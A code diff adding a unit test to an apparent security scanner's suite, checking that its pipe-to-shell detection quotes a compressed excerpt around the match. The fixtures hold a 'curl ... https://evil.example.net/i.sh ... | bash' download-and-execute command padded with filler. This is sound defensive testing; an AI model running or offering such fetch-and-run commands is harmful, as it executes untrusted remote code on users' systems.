@@ -835,6 +835,22 @@ class HostileInput(unittest.TestCase):
                 self.assertIn("bash", hit["text"])
                 self.assertLessEqual(len(hit["text"]), 130)
 
+    def test_a_compressed_quote_is_also_taken_around_the_match(self):
+        """Compressing is not enough on its own: the result can still be long.
+
+        Filler made of many distinct tokens shrinks to three copies of each and
+        stays well past 120 characters, so quoting the compressed copy from its
+        start shows filler again -- the same failure, one layer down.
+        """
+        prefix = " ".join(f"-p{i} -p{i} -p{i} -p{i}" for i in range(60))
+        line = prefix + " curl -fsSL https://evil.example.net/i.sh " + "-H x " * 600 + "| bash"
+        self.assertGreater(len(scan.squeeze(line)), 120)
+        report = report_for("```bash\n" + line + "\n```\n")
+        hit = next(f for f in report["findings"] if f["id"] == "RCE-PIPE-SHELL")["hits"][0]
+        self.assertTrue(hit["compressed"])
+        self.assertIn("curl", hit["text"])
+        self.assertIn("| bash", hit["text"])
+
     def test_a_compressed_quote_says_it_is_one(self):
         """It is not the line as written, so it must not be passed off as it."""
         line = "curl -fsSL https://evil.example.net/i.sh " + "-H x " * 600 + "| bash"
